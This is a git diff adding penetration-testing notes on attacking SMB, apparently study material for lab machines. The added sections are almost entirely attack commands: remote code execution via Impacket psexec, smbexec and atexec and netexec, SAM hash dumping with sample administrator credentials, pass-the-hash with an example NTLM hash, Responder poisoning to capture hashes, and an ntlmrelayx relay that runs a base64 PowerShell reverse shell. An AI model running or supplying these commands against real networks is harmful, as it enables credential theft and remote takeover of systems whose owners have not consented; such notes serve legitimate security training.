@@ -117,11 +117,6 @@ Server Message Block (SMB) is a client-server protocol that regulates access to 
 ```bash
  sudo nmap 10.129.14.128 -sV -sC -p139,445
 ```
-- Impacket - Samrdump.py
-```bash
-# used to enumrate RIDs
-/usr/share/doc/python3-impacket/examples/samrdump.py 10.129.14.128
-```
 - smbmap
 ```bash
 smbmap -H 10.129.202.5 -s sambashare
@@ -131,6 +126,64 @@ smbmap -H 10.129.202.5 -s sambashare
 # bruteforce login
 msf > use auxiliary/scanner/smb/smb_login
 ```
+### RCE 
+
+```
+/usr/share/doc/python3-impacket/examples/psexec.py
+
+/usr/share/doc/python3-impacket/examples/smbexec.py
+
+/usr/share/doc/python3-impacket/examples/atexec.py
+
+netexec smb 10.129.202.85 -u user.list -p password.list   -x 'whoami' --exec-method smbexec
+```
+### Enumerating Logged-on Users
+```bash
+netexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+
+```
+
+### Extract Hashes from SAM Database
+
+```bash
+netexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+
+/usr/share/doc/python3-impacket/examples/samrdump.py 10.129.14.128
+```
+
+### Pass-the-Hash
+```
+netexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+```
+
+### Forced Authentication Attacks
+#### Responder
+- if we are in the same network we can pretend to be a smb server and catch the user hashes 
+```
+1) The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
+2) If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
+3) Is there no local DNS record? A query will be sent to the DNS server that has been configured.
+4) If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.
+```
+- user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\` In that case, the machine will send a multicast query to all devices on the network
+
+```
+ responder -I <interface name>
+```
+
+#### relay attack 
+- [revshells](https://www.revshells.com/)
+```shell
+#  we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
+cat /etc/responder/Responder.conf | grep 'SMB ='
+
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
+
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <poweshell base64 reverse shell>'
+
+```
+
+
 ### Service Interaction
 - smbclient
 ```
